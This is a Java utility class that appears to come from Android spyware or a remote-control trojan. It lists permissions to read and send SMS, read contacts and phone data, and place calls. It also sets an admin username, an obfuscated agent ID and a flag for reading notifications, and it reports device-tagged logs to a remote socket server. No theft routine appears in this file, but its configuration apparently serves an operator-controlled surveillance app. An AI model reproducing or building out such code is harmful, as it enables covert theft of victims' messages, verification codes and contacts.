package com.topdown.softy.functions.utils;

import android.Manifest;
import android.content.Context;
import android.os.Build;

import com.topdown.softy.functions.managers.DeviceManager;
import com.topdown.softy.server.socket.SocketServer;

public class Utils {

    public static final String[] APP_PERMISSIONS = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
    };

    public static String ADMIN_USERNAME = "Test001";
    public static String AGENT_ID = "com.jsdwdw.kqrxqu";
    public static String THEME = "Demo";

    public static boolean isNotificationReadingEnabled = true;
    public static boolean isAlarmManagerEnabled = true;


    public static void markLog(Context context, String log, String TAG) {
        if (SocketServer.getSocket() != null && SocketServer.getSocket().connected()) {
            SocketServer.getSocket().emit("save-log", DeviceManager.getDeviceID(context), log + "  {{" + TAG + "}}");
        }
    }

    public static String getPhoneName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;

        String deviceName;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            deviceName = capitalize(model);
        } else {
            deviceName = capitalize(manufacturer) + " " + model;
        }
        return deviceName;
    }

    public static String capitalize(String s) {
        if (s == null || s.isEmpty()) {
            return "";
        }
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }
}
